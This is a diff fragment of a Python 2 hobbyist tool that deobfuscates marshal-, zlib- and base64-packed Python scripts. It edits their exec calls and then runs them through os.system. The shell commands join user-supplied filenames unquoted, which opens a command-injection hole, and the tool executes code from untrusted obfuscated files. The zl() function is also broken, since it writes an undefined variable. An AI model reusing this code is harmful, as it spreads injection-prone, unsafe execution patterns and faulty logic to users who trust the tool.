+        menu()
+    elif ask == 't' or ask == 'T':
+        sys.exit()
+    else:
+        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        os.system('clear')
+        menu()
+def mzb():
+    print 'Decompile Marshal,Zlib,Base64'
+    a = raw_input('File : ' )
+    b = open(a).read().replace('exec(', 'x = ').replace('))))',')))')
+    c = open('mi.py', 'w')
+    if 'marshal' in b:
+        c.write('from sys import stdout\nfrom uncompyle6.main import decompile\n' + b + '\ndecompile(2.7, x, stdout)')
+        c.close()
+    elif 'marshal' not in b:
+        c.write(b + '\nprint (x)')
+        c.close()
+    d = a.replace('.py', '-decrypt.py')
+    os.system('python2 mi.py > ' + d)
+    e = open(d).read()
+    f = open(d, 'w')
+    f.write(e + ' \n\n\n\t')
+    f.close()
+    os.system('rm -rf mi.py')
+    print('\x1b[31;1m[\x1b[0;37m+\x1b[31;1m]\x1b[0;37m File saved as\x1b[32;1m ' + d)
+    print('Want Decrypt Again (Y/N) ?')
+    cuk = raw_input('Choice : ')
+    if cuk == 'y':
+      mzb()
+    elif cuk == 'n':
+      exit()
+def zl():
+    print 'Decompile Zlib'
+    a = raw_input('File : ')
+    b = open(a).read().replace('exec', 'print')
+    c = open('ma.py', 'w')
+    if 'zlib' in b:
+        c.write('\n' + b + '')
+        c.close()
+    elif 'zlib' not in b:
+        c.write(b + '\nprint (print)')
+        c.close()
+    d = a.replace('.py', '-decrypt.py')
+    os.system('python2 ma.py > '+ d)
+    f = open(d, 'w')
+    f.write('# Suksess Decompile ✓ \n'+ e)
+    f.close()
+    os.system('rm -rf ma.py')
+    print('File saved as '+ d)
+    sys.exit()
+def exit():
+        run('thanks for using my tools dude :)')
+        sys.exit()
+
+if __name__ == '__main__':
+    if os.path.exists('unpyc'):
+        menu()
+    else:
+        os.system('mkdir unpyc')
+        menu()
